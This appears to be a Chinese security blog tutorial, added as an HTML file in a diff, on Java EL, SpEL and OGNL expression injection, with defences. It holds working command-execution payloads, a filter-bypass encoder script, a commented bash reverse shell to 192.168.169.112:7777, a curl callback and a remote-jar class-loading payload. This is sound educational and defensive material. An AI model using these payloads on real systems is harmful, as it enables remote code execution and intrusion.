@@ -1,0 +1,545 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>Java表达式注入 | Hurn's Blog</title><meta name="description" content="Java表达式注入 - Hurn"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hurn's Blog"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="Hurn's Blog"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/Dreyer" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Java表达式注入</h1><div class="post-info"><a></a>2022-06-13</div><div class="post-content"><p>Java中提供非常多的表达式方便开发者操作数据和对象，当表达式的参数可控时也会方便攻击者。</p>
+<h1 id="0x1-EL-表达式注入"><a href="#0x1-EL-表达式注入" class="headerlink" title="0x1. EL 表达式注入"></a>0x1. EL 表达式注入</h1><p>EL表达式， 也就是Expression Languag，提供了在 JSP 中简化表达式的方法，让JSP的代码更加简化、数据操作会起来更加方便，另外EL表达式还可以操作Java对象、方法。</p>
+<h2 id="0x1-1-EL表达式基础用法"><a href="#0x1-1-EL表达式基础用法" class="headerlink" title="0x1.1 EL表达式基础用法"></a>0x1.1 EL表达式基础用法</h2><p>以<code>$&#123;</code>开始，以<code>&#125;</code>作为结束：</p>
+<pre><code class="txt">$&#123;EL表达式&#125;
+</code></pre>
+<p>获取某对象的值可以直接写入对象的名称，如获取对象名为user的对象的值：</p>
+<pre><code class="txt">$&#123;user&#125;
+$&#123;username&#125;
+</code></pre>
+<p>获取某对象的属性的值使用点操作符（<code>.</code>操作符），如获取对象user的name属性和age属性的值的语法如下：</p>
+<pre><code>$&#123;user.name&#125;
+$&#123;user.age&#125;
+</code></pre>
+<pre><code class="txt">$&#123;user[&quot;name&quot;]&#125;
+</code></pre>
+<blockquote>
+<p> <code>$&#123;username&#125;</code> 执行过程中，如果没有指定从哪里取出数据，默认回从Page、Request、Session、Application范围查找，如果找到就回传，没有就返回””</p>
+</blockquote>
+<p><strong>操作符：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">类型</th>
+<th>符号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">算术型</td>
+<td>+、-（二元）、<code>*</code>、/、div、%、mod、-（一元）</td>
+</tr>
+<tr>
+<td align="center">逻辑型</td>
+<td>and、&amp;&amp;、or、双管道符、!、not</td>
+</tr>
+<tr>
+<td align="center">关系型</td>
+<td>==、eq、!=、ne、&lt;、lt、&gt;、gt、&lt;=、le、&gt;=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。</td>
+</tr>
+<tr>
+<td align="center">空</td>
+<td>empty 空操作符是前缀操作，可用于确定值是否为空。</td>
+</tr>
+<tr>
+<td align="center">条件型</td>
+<td>A ?B :C。根据 A 赋值的结果来赋值 B 或 C。</td>
+</tr>
+</tbody></table>
+<p><strong>隐式对象</strong> </p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>隐含对象名称</th>
+<th>描 述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>pageContext</td>
+<td>对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）</td>
+</tr>
+<tr>
+<td>2</td>
+<td>pageScope</td>
+<td>代表page域中用于保存属性的Map对象</td>
+</tr>
+<tr>
+<td>3</td>
+<td>requestScope</td>
+<td>代表request域中用于保存属性的Map对象</td>
+</tr>
+<tr>
+<td>4</td>
+<td>sessionScope</td>
+<td>代表session域中用于保存属性的Map对象</td>
+</tr>
+<tr>
+<td>5</td>
+<td>applicationScope</td>
+<td>代表application域中用于保存属性的Map对象</td>
+</tr>
+<tr>
+<td>6</td>
+<td>param</td>
+<td>表示一个保存了所有请求参数的Map对象</td>
+</tr>
+<tr>
+<td>7</td>
+<td>paramValues</td>
+<td>表示一个保存了所有请求参数的Map对象，它对于某个请求参数，返回的是一个string[]</td>
+</tr>
+<tr>
+<td>8</td>
+<td>header</td>
+<td>表示一个保存了所有http请求头字段的Map对象，注意：如果头里面有“-” ，例Accept-Encoding，则要header[“Accept-Encoding”]</td>
+</tr>
+<tr>
+<td>9</td>
+<td>headerValues</td>
+<td>表示一个保存了所有http请求头字段的Map对象，它对于某个请求参数，返回的是一个string[]数组。注意：如果头里面有“-” ，例Accept-Encoding，则要headerValues[“Accept-Encoding”]</td>
+</tr>
+<tr>
+<td>10</td>
+<td>cookie</td>
+<td>表示一个保存了所有cookie的Map对象</td>
+</tr>
+<tr>
+<td>11</td>
+<td>initParam</td>
+<td>表示一个保存了所有web应用初始化参数的map对象</td>
+</tr>
+</tbody></table>
+<p><strong>操作函数</strong></p>
+<p>EL表达式语法允许开发人员开发自定义函数，以调用Java类的方法。语法：<code>$&#123;prefix：method(params)&#125;</code></p>
+<pre><code>$&#123;ns:func(param1, param2, ...)&#125;
+</code></pre>
+<p>ns 指的是命名空间 , func 指的是函数名， param 指的是参数</p>
+<p><strong>在EL表达式中调用的只能是Java类的静态方法，这个Java类的静态方法需要在TLD文件中描述，才可以被EL表达式调用。</strong></p>
+<p>如果在项目中需要使用EL表达式,那么需要添加el-api.jar依赖包，通常在Web容器下都有相应版本的el-api.jar,比如Tomcat容器.</p>
+<pre><code class="xml">&lt;dependency&gt;  
+    &lt;groupId&gt;javax.el&lt;/groupId&gt;  
+    &lt;artifactId&gt;javax.el-api&lt;/artifactId&gt;  
+    &lt;version&gt;2.2.4&lt;/version&gt;  
+    &lt;scope&gt;provided&lt;/scope&gt;  
+&lt;/dependency&gt;  
+</code></pre>
+<h2 id="0x1-2-EL表达式注入"><a href="#0x1-2-EL表达式注入" class="headerlink" title="0x1.2 EL表达式注入"></a>0x1.2 EL表达式注入</h2><p>搜索特征：</p>
+<pre><code class="jsp">javax.el.ExpressionFactory.createValueExpression()
+javax.el.ValueExpression.getValue()
+</code></pre>
+<p>POM依赖：</p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;
+    &lt;artifactId&gt;juel-impl&lt;/artifactId&gt;
+    &lt;version&gt;2.2.7&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>如果下面这个表达式可控，即可注入执行代码</p>
+<pre><code class="java">import de.odysseus.el.ExpressionFactoryImpl;
+import de.odysseus.el.util.SimpleContext;
+import Javax.el.*;
+public class Main &#123;
+    public static void main(String[] args) &#123;
+        ExpressionFactory factory = new ExpressionFactoryImpl();
+        SimpleContext context = new SimpleContext();
+        String pl = &quot;ABC $&#123;true.toString().toUpperCase()&#125;&quot;;
+        ValueExpression e = factory.createValueExpression(context, pl, String.class);
+        System.out.println(e.getValue(context));
+    &#125;
+&#125;
+</code></pre>
+<p>通用：</p>
+<pre><code class="jsp">// 通用检测且无害，表达式计算
+$&#123;1111+2222&#125;
+
+//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）
+$&#123;pageContext&#125;
+
+//获取Web路径
+$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;
+
+//文件头参数
+$&#123;header&#125;
+
+//获取webRoot
+$&#123;applicationScope&#125;
+
+// 利用反射执行命令
+$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;).getInputStream())&#125;
+
+// 利用JS执行代码  $&#123;&#39;&#39;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&#39;whoami&#39;)&quot;)&#125;
+</code></pre>
+<h2 id="0x1-3-Bypass"><a href="#0x1-3-Bypass" class="headerlink" title="0x1.3 Bypass"></a>0x1.3 Bypass</h2><ol>
+<li>字符编码、unicode、八进制    </li>
+</ol>
+<pre><code>$&#123;true.toString().charAt(0).toChars(67)[0].toString()&#125;
+</code></pre>
+<p>利用以上原理，通过 charAt 与 toChars 获取字符，在由 toString 转字符串再用 concat 拼接来绕过一些敏感字符的过滤</p>
+<p><a target="_blank" rel="noopener" href="http://j0k3r.top/2020/08/13/java-expression/#0x04-EL-%E7%BB%95%E8%BF%87%E4%B8%8E%E9%98%B2%E5%BE%A1">生成脚本:</a></p>
+<pre><code class="python">#coding: utf-8
+
+#payload = &quot;bash$IFS-i$IFS&gt;&amp;$IFS/dev/tcp/192.168.169.112/7777$IFS0&gt;&amp;1&quot;
+#payload = &quot;bash$IFS-c$IFS&#39;curl 192.168.169.112:7777&#39;&quot;
+#exp = &#39;$&#123;pageContext.setAttribute(&quot;%s&quot;,&quot;&quot;.getClass().forName(&quot;%s&quot;).getMethod(&quot;%s&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;%s&quot;).getMethod(&quot;%s&quot;).invoke(null),&quot;%s&quot;))&#125;&#39; % (&#39;a&#39;,&#39;java.lang.Runtime&#39;,&#39;exec&#39;,&#39;java.lang.Runtime&#39;,&#39;getRuntime&#39;,&#39;open -a Calculator.app&#39;)
+
+def encode(payload):
+    encode_payload = &quot;&quot;
+    for i in range(0, len(payload)):
+        if i == 0:
+            encode_payload += &quot;true.toString().charAt(0).toChars(%d)[0].toString()&quot; % ord(payload[0])
+        else:
+            encode_payload += &quot;.concat(true.toString().charAt(0).toChars(%d)[0].toString())&quot; % ord(payload[i])
+    return encode_payload
+
+exp = &#39;$&#123;pageContext.setAttribute(%s,&quot;&quot;.getClass().forName(%s).getMethod(%s,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(%s).getMethod(%s).invoke(null),%s))&#125;&#39; % (encode(&#39;a&#39;),encode(&#39;java.lang.Runtime&#39;),encode(&#39;exec&#39;),encode(&#39;java.lang.Runtime&#39;),encode(&#39;getRuntime&#39;),encode(&#39;open -a Calculator.app&#39;))
+
+print(exp)
+</code></pre>
+<ol start="2">
+<li>反射，类似下面的spel中的ClassLoader执行代码</li>
+</ol>
+<h2 id="0x1-4-防御"><a href="#0x1-4-防御" class="headerlink" title="0x1.4 防御"></a>0x1.4 防御</h2><ul>
+<li>过滤敏感内容</li>
+<li>使用其它方法</li>
+<li>在 JSP 中加入<code>&lt;%@ page isELIgnored=&quot;false&quot; %&gt;</code> 禁用</li>
+</ul>
+<h1 id="0x2-SpEL-表达式"><a href="#0x2-SpEL-表达式" class="headerlink" title="0x2. SpEL 表达式"></a>0x2. SpEL 表达式</h1><p>Spring Expression Language（简称SpEL），相当于在Spring中的加强、专用版EL表达式</p>
+<h2 id="0x2-1-SpEL表达式基础用法"><a href="#0x2-1-SpEL表达式基础用法" class="headerlink" title="0x2.1 SpEL表达式基础用法"></a>0x2.1 SpEL表达式基础用法</h2><p>基本用法一，直接解析获取表达式的值：</p>
+<pre><code class="java">package com.example.testspring;
+
+import org.junit.jupiter.api.Test;
+import org.springframework.boot.test.context.SpringBootTest;
+import org.springframework.expression.Expression;
+import org.springframework.expression.ExpressionParser;
+import org.springframework.expression.spel.standard.SpelExpressionParser;
+
+public class TestSpel &#123;
+    @Test
+    void testSpel()&#123;
+        // 创建解析器
+        ExpressionParser parser = new SpelExpressionParser();
+        // 解析表达式
+        Expression expression = parser.parseExpression(&quot;&#39;Hello World&#39;.concat(&#39;!&#39;)&quot;);
+        Expression expression1 = parser.parseExpression(&quot;1+1&quot;);
+        // 取值
+        System.out.println(expression.getValue());
+        System.out.println(expression1.getValue());
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/2022/06/13/Java/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20220618101052824.png" alt="image-20220618101052824"></p>
+<p>基本用法二，表达式操作自定义对象：</p>
+<pre><code class="java">package com.example.testspring;
+
+import org.junit.jupiter.api.Test;
+import org.springframework.boot.test.context.SpringBootTest;
+import org.springframework.expression.Expression;
+import org.springframework.expression.ExpressionParser;
+import org.springframework.expression.spel.standard.SpelExpressionParser;
+import org.springframework.expression.spel.support.StandardEvaluationContext;
+
+public class TestSpel &#123;
+    class User&#123;
+        public String name = &quot;hhh&quot;;
+
+        public String getName() &#123;
+            return name;
+        &#125;
+
+        public void setName(String name) &#123;
+            this.name = name;
+        &#125;
+    &#125;
+    @Test
+    void testSpel2()&#123;
+        // 创建一个对象
+        User user = new User();
+        // 创建一个容器
+        StandardEvaluationContext context = new StandardEvaluationContext();
+        // 在容器中设置一个变量
+        context.setVariable(&quot;user&quot;, user);
+        // 创建解析器
+        SpelExpressionParser parser = new SpelExpressionParser();
+        // 解析表达式
+        Expression expression = parser.parseExpression(&quot;#user.name&quot;);
+        // 取值
+        System.out.println(expression.getValue(context));
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/2022/06/13/Java/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20220618101035697.png" alt="image-20220618101035697"></p>
+<blockquote>
+<p>注意：</p>
+<ol>
+<li><code>#&#123;&#125;</code>是S pEL的定界符，用于指明内容未SpEL表达式并执行；</li>
+<li><code>$&#123;&#125;</code>主要用于加载外部属性文件中的值；</li>
+<li>两者可以混合使用，但是必须<code>#&#123;&#125;</code>在外面，<code>$&#123;&#125;</code>在里面，如<code>#&#123;&#39;$&#123;&#125;&#39;&#125;</code>，注意单引号是字符串类型才添加的；</li>
+</ol>
+</blockquote>
+<h2 id="0x2-2-类类型表达式T-Type"><a href="#0x2-2-类类型表达式T-Type" class="headerlink" title="0x2.2 类类型表达式T(Type)"></a>0x2.2 类类型表达式T(Type)</h2><p>SpEL语法中的<code>T()</code>操作符 , <code>T()</code>操作符会返回一个object , 它可以帮助我们获取某个类的<code>静态方法</code> , 用法<code>T(全限定类名).方法名()</code>，后面会用得到</p>
+<p>创建一个静态方法：</p>
+<pre><code class="java">package com.example.testspring;
+
+public class User &#123;
+    public static String name = &quot;hhh&quot;;
+
+    public static String getName() &#123;
+        return name;
+    &#125;
+
+    public void setName(String name) &#123;
+        User.name = name;
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">package com.example.testspring;
+
+import org.junit.jupiter.api.Test;
+import org.springframework.boot.test.context.SpringBootTest;
+import org.springframework.expression.Expression;
+import org.springframework.expression.ExpressionParser;
+import org.springframework.expression.spel.standard.SpelExpressionParser;
+import org.springframework.expression.spel.support.StandardEvaluationContext;
+
+public class TestSpel &#123;
+    @Test
+    void testSpel3()&#123;
+        ExpressionParser parser = new SpelExpressionParser();
+        Expression expression = parser.parseExpression(&quot;T(com.example.testspring.User).getName()&quot;);
+        System.out.println(expression.getValue(String.class));
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/2022/06/13/Java/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20220618102137804.png" alt="image-20220618102137804"></p>
+<h2 id="0x2-3-SpEL表达式注入"><a href="#0x2-3-SpEL表达式注入" class="headerlink" title="0x2.3 SpEL表达式注入"></a>0x2.3 SpEL表达式注入</h2><p>搜索特征：</p>
+<pre><code class="java">//关键类
+org.springframework.expression.Expression
+org.springframework.expression.ExpressionParser
+org.springframework.expression.spel.standard.SpelExpressionParser
+
+//调用特征
+ExpressionParser parser = new SpelExpressionParser();
+Expression expression = parser.parseExpression(str);
+expression.getValue()
+expression.setValue()
+</code></pre>
+<p>当表达式可控时，即可执行代码：</p>
+<pre><code class="java">package com.example.testspring;
+
+import org.junit.jupiter.api.Test;
+import org.springframework.boot.test.context.SpringBootTest;
+import org.springframework.expression.Expression;
+import org.springframework.expression.ExpressionParser;
+import org.springframework.expression.spel.standard.SpelExpressionParser;
+import org.springframework.expression.spel.support.StandardEvaluationContext;
+
+public class TestSpel &#123;
+    @Test
+    void testSpel4()&#123;
+        String cmdStr = &quot;new java.lang.ProcessBuilder(new String[]&#123;\&quot;open\&quot;,\&quot;/System/Applications/Calculator.app\&quot;&#125;).start()&quot;;
+
+        ExpressionParser parser = new SpelExpressionParser();
+        Expression exp = parser.parseExpression(cmdStr);
+        System.out.println( exp.getValue() );
+    &#125;
+&#125;
+</code></pre>
+<p>类类型表达式：</p>
+<pre><code class="java">T(java.lang.Runtime).getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;);
+// 内置java.lang 包
+T(Runtime).getRuntime().exec(new String[]&#123;&quot;open&quot;,&quot;/System/Applications/Calculator.app&quot;&#125;)
+</code></pre>
+<h2 id="0x2-4-Bypass"><a href="#0x2-4-Bypass" class="headerlink" title="0x2.4 Bypass"></a>0x2.4 Bypass</h2><h3 id="0x2-4-1-通过JS执行代码"><a href="#0x2-4-1-通过JS执行代码" class="headerlink" title="0x2.4.1 通过JS执行代码"></a>0x2.4.1 通过JS执行代码</h3><p>获取所有js引擎信息</p>
+<pre><code class="java">public static void main(String[] args) &#123;
+        ScriptEngineManager manager = new ScriptEngineManager();
+        List&lt;ScriptEngineFactory&gt; factories = manager.getEngineFactories();
+        for (ScriptEngineFactory factory: factories)&#123;
+                System.out.printf(
+                    &quot;Name: %s%n&quot; + &quot;Version: %s%n&quot; + &quot;Language name: %s%n&quot; +
+                    &quot;Language version: %s%n&quot; +
+                    &quot;Extensions: %s%n&quot; +
+                    &quot;Mime types: %s%n&quot; +
+                    &quot;Names: %s%n&quot;,
+                    factory.getEngineName(),
+                    factory.getEngineVersion(),
+                    factory.getLanguageName(),
+                    factory.getLanguageVersion(),
+                    factory.getExtensions(),
+                    factory.getMimeTypes(),
+                    factory.getNames()
+                );
+        &#125;
+&#125;
+</code></pre>
+<blockquote>
+<p>输出：</p>
+<p>Name: Oracle Nashorn<br>Version: 1.8.0_322-b06<br>Language name: ECMAScript<br>Language version: ECMA - 262 Edition 5.1<br>Extensions: [js]<br>Mime types: [application/javascript, application/ecmascript, text/javascript, text/ecmascript]<br>Names: [nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</p>
+</blockquote>
+<p>nashorn</p>
+<pre><code class="java">ScriptEngineManager sem = new ScriptEngineManager();
+ScriptEngine engine = sem.getEngineByName(&quot;nashorn&quot;);
+System.out.println(engine.eval(&quot;2+1&quot;));
+</code></pre>
+<pre><code class="java">new javax.script.ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(&quot;s=[2];s[0]=&#39;open&#39;;s[1]=&#39;/System/Applications/Calculator.app&#39;;java.lang.Runtime.getRuntime().exec(s);&quot;);
+</code></pre>
+<pre><code class="java">String cmdStr = &quot;new javax.script.ScriptEngineManager().getEngineByName(\&quot;nashorn\&quot;).eval(\&quot;s=[2];s[0]=&#39;open&#39;;s[1]=&#39;/System/Applications/Calculator.app&#39;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;;
+Expression exp =parser.parseExpression(cmdStr);
+exp.getValue();
+</code></pre>
+<p>javascript</p>
+<pre><code class="java">new javax.script.ScriptEngineManager().getEngineByName(&quot;javascript&quot;).eval(&quot;s=[2];s[0]=&#39;open&#39;;s[1]=&#39;/System/Applications/Calculator.app&#39;;java.lang.Runtime.getRuntime().exec(s);&quot;)
+</code></pre>
+<h3 id="0x2-4-2-通过ClassLoader执行代码"><a href="#0x2-4-2-通过ClassLoader执行代码" class="headerlink" title="0x2.4.2 通过ClassLoader执行代码"></a>0x2.4.2 通过ClassLoader执行代码</h3><ul>
+<li>URLClassLoader</li>
+</ul>
+<pre><code>new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&quot;http://127.0.0.1:8999/Exp.jar&quot;)&#125;).loadClass(&quot;Exp&quot;).getConstructors()[0].newInstance(&quot;127.0.0.1:2333&quot;)
+</code></pre>
+<ul>
+<li>AppClassLoader</li>
+</ul>
+<pre><code class="java">T(ClassLoader).getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;)
+</code></pre>
+<pre><code class="java">T(ClassLoader).getSystemClassLoader().loadClass(&quot;java.lang.ProcessBuilder&quot;).getConstructors()[1].newInstance(new String[]&#123;&quot;open&quot;,&quot;/System/Applications/Calculator.app&quot;&#125;).start()
+</code></pre>
+<ul>
+<li>使用框架的ClassLoader</li>
+</ul>
+<p>使用spel的话一定存在名为org.springframework的包，这个包下有许许多多的类，而这些类的classloader就是app</p>
+<pre><code class="java">T(org.springframework.expression.Expression).getClass().getClassLoader()
+</code></pre>
+<ul>
+<li>通过内置对象加载UrlClassLoader</li>
+</ul>
+<p>在web中，使用spel，这两个对象会自动注入</p>
+<pre><code class="java">&#123;request.getClass().getClassLoader().loadClass(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;).invoke(null).exec(\&quot;touch/tmp/foobar\&quot;)&#125;
+</code></pre>
+<h3 id="0x2-4-3-字符串绕过"><a href="#0x2-4-3-字符串绕过" class="headerlink" title="0x2.4.3 字符串绕过"></a>0x2.4.3 字符串绕过</h3><ul>
+<li>字符串替换</li>
+</ul>
+<pre><code class="java">T(String).getName()[0].replace(106,104)+T(String).getName()[0].replace(106,51)+T(String).getName()[0].replace(106,122)+T(String).getName()[0].replace(106,104)+T(String).getName()[0].replace(106,49)
+</code></pre>
+<ul>
+<li>Character</li>
+</ul>
+<pre><code class="java">T(Character).toString(104)+T(Character).toString(51)+T(Character).toString(122)
+</code></pre>
+<ul>
+<li>外部可控字符绕过，类似于第一个字符串替换</li>
+</ul>
+<p>通过web请求构造字符串,request有很多方法返回值为String也有String[]用来给getMethod或者getDeclaredMethod的方法定制参数</p>
+<pre><code class="java">request.getMethod().substring(0,1).replace(80,104)%2b#request.getMethod().substring(0,1).replace(80,51)%2b#request.getMethod().substring(0,1).replace(80,122)%2b#request.getMethod().substring(0,1).replace(80,104)%2b#request.getMethod().substring(0,1).replace(80,49)
+</code></pre>
+<h2 id="0x2-5-防御"><a href="#0x2-5-防御" class="headerlink" title="0x2.5 防御"></a>0x2.5 防御</h2><p>SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：</p>
+<ul>
+<li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li>
+<li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li>
+</ul>
+<p>可以直接使用SimpleEvaluationContext替换StandardEvaluationContext</p>
+<pre><code class="java">    @Test
+    void testSpel8()&#123;
+        String spel = &quot;T(java.lang.Runtime).getRuntime().exec(\&quot;open /System/Applications/Calculator.app\&quot;)&quot;;
+        ExpressionParser parser = new SpelExpressionParser();
+        User user = new User();
+        EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(user).build();
+        Expression expression = parser.parseExpression(spel);
+        System.out.println(expression.getValue(context));
+    &#125;
+</code></pre>
+<h1 id="0x3-OGNL表达式"><a href="#0x3-OGNL表达式" class="headerlink" title="0x3. OGNL表达式"></a>0x3. OGNL表达式</h1><p>OGNL全称Object-Graph Navigation Language即对象导航图语言，可以简单理解为一种非常强大的表达式，用来方便的存、取和调用对象。</p>
+<h2 id="0x3-1-OGNL-表达式基础用法"><a href="#0x3-1-OGNL-表达式基础用法" class="headerlink" title="0x3.1 OGNL 表达式基础用法"></a>0x3.1 OGNL 表达式基础用法</h2><p>OGNL表达式三要素：</p>
+<ul>
+<li>表达式（Expression），定义如何取值、如何操作对象或者数据</li>
+<li>根对象 (Root)，定义对谁操作</li>
+<li>上下文（Context)，根对象的上下文环境，有点数据库的味道，描述对象与对象之间的关系，靠这种关系才能方便表达式操作对象</li>
+</ul>
+<pre><code class="java">package ognlExpression;
+
+import ognl.Ognl;
+import ognl.OgnlContext;
+import ognl.OgnlException;
+
+public class OgnlExpression &#123;
+    public static void main(String[] args) throws OgnlException &#123;
+                // 初始化相关对象
+        School school = new School();
+        SchoolMaster schoolMaster = new SchoolMaster();
+        school.setSchoolMaster(schoolMaster);
+        Student student = new Student();
+        student.setSchool(school);
+        //
+        Student student1 =  new Student();
+        student1.setName(&quot;WangWu&quot;);
+        student1.setSchool(school);
+
+        // OGNL表达式
+        OgnlContext context = new OgnlContext();
+        // 设置根对象
+        context.setRoot(student);
+        // 上下文添加对象
+        context.put(&quot;student1&quot;, student1);
+
+        // Ognl 取根对象相关属性
+        Object name = Ognl.getValue(&quot;name&quot;, context, context.getRoot());
+        System.out.println(name);
+        Object schoolName = Ognl.getValue(&quot;school.name&quot;, context, context.getRoot());
+        System.out.println(schoolName);
+
+        // Ognl 取非根对象相关属性
+        Object student1Name = Ognl.getValue(&quot;#student1.name&quot;, context, context.getRoot());
+        System.out.println(student1Name);
+        Object student1SchoolName = Ognl.getValue(&quot;#student1.school.name&quot;, context, context.getRoot());
+        System.out.println(student1SchoolName);
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/2022/06/13/Java/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20220619223346549.png" alt="image-20220619223346549"></p>
+<p>OGNL获取对象</p>
+<ul>
+<li>静态对象、静态方法和静态变量，使用 <code>@</code></li>
+</ul>
+<pre><code class="java">@java.lang.System@getProperty(&quot;user.dir&quot;)
+@java.lang.Math@abs(-111)
+</code></pre>
+<ul>
+<li>非原生对象，也就是非Root对象，使用<code>#</code></li>
+</ul>
+<pre><code class="java">#student.name
+#student.takingClasses(&quot;英语&quot;)
+</code></pre>
+<ul>
+<li>简单对象，可以直接获取</li>
+</ul>
+<pre><code class="java">&quot;string&quot;.lenth
+5
+true
+</code></pre>
+<h2 id="0x3-2-OGNL表达式注入"><a href="#0x3-2-OGNL表达式注入" class="headerlink" title="0x3.2 OGNL表达式注入"></a>0x3.2 OGNL表达式注入</h2><p>低版本环境：2.7.3 </p>
+<pre><code class="xml">&lt;dependency&gt;
+  &lt;groupId&gt;ognl&lt;/groupId&gt;
+  &lt;artifactId&gt;ognl&lt;/artifactId&gt;
+  &lt;version&gt;2.7.3&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>POC:</p>
+<pre><code class="java">package ognlExpression;
+
+import ognl.Ognl;
+import ognl.OgnlContext;
+import ognl.OgnlException;
+
+public class OgnlExpression &#123;
+    public static void main(String[] args) throws OgnlException &#123;
+        OgnlContext context = new OgnlContext();
+        Ognl.getValue(&quot;@java.lang.Runtime@getRuntime().exec(&#39;open /System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;)&quot;, context, context.getRoot());
+    &#125;
+&#125;
+</code></pre>
+<p>给Runtime.exec打上断点，进行回溯分析：</p>
+<p><img src="/2022/06/13/Java/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20220619232616424.png" alt="image-20220619232616424"></p>
+<p>留个坑，等分析Struts2</p>
+<h1 id="0x4-参考"><a href="#0x4-参考" class="headerlink" title="0x4. 参考"></a>0x4. 参考</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10482">https://xz.aliyun.com/t/10482</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7692">https://xz.aliyun.com/t/7692</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9245">https://xz.aliyun.com/t/9245</a></p>
+<p><a target="_blank" rel="noopener" href="http://j0k3r.top/2020/08/13/java-expression/#0x03-EL-%E6%B3%A8%E5%85%A5">http://j0k3r.top/2020/08/13/java-expression/#0x03-EL-%E6%B3%A8%E5%85%A5</a></p>
+</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/06/14/Java/SpringBootCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">prev</a><a class="next" href="/2022/06/13/Java/log4j/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">Hurn</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>
